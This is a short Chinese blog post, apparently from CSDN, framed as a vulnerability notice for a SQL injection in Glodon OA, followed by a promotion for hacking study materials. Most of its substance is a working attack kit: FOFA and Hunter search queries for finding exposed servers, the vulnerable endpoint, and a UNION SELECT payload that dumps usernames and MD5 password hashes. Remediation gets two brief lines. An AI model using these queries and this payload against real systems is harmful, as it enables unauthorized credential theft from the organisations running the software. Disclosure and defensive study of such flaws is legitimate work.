# 原创
：  漏洞通告| 广联达OA SQL注入漏洞获取用户名密码

# 漏洞通告| 广联达OA SQL注入漏洞获取用户名密码

### 广联达OA介绍

广联达办公OA是一款综合办公自动化解决方案，旨在提高组织内部的工作效率和协作能力。它提供了一系列功能和工具，帮助企业管理和处理日常办公任务、流程和文档。

### 资产收集

fofa：fid=”/yV4r5PdARKT4jaqLjJYqw==”或者body=”/Services/Identification/Server”<br/> hunter：web.body=”/Services/Identification/Server/“

### 漏洞点

广联达OA SQL注入漏洞位于 /Webservice/IM/Config/ConfigService.asmx/GetIMDictionary 接口下，直接访问，页面会提示缺少参数key，说明存在SQL注入

### 漏洞复现

payload：

```
key=1' UNION ALL SELECT top 1 concat(F_CODE,':',F_PWD_MD5) from T_ORG_USER --

```

效果如下：

### 修复建议

1.问/Webservice/IM/Config/ConfigService.asmx/GetIMDictionary 地址的时候，可以让报错信息模糊化<br/> 2.对key参数的传参进行过滤

 申明：本账号所分享内容仅用于网络安全技术讨论，切勿用于违法途径，所有渗透都需获取授权，违者后果自行承担，与本号及作者无关，请谨记守法。

###### **免费领取安全学习资料包！**<img alt="" height="768" src="https://img-blog.csdnimg.cn/direct/2f74894cf8e04b7f87d9716681f6e26b.png" width="1024"/>

渗透工具

技术文档、书籍

<img alt="" height="516" src="https://img-blog.csdnimg.cn/direct/5b4209eac3784bd18f5e1cd6a5157e4e.png" width="852"/> <img alt="" height="523" src="https://img-blog.csdnimg.cn/direct/4a89b0c2a52a4f569a970e55dcbac0b4.png" width="856"/>

面试题

帮助你在面试中脱颖而出

视频

基础到进阶

环境搭建、HTML，PHP，MySQL基础学习，信息收集，SQL注入,XSS，CSRF，暴力破解等等

<img alt="" height="481" src="https://img-blog.csdnimg.cn/direct/4f211474c8ab4a5a910884e1d3423310.png" width="694"/> <img alt="" height="77" src="https://img-blog.csdnimg.cn/direct/54c2816350ae4bf787d1c6eec0d4e837.png" width="665"/>

应急响应笔记

学习路线
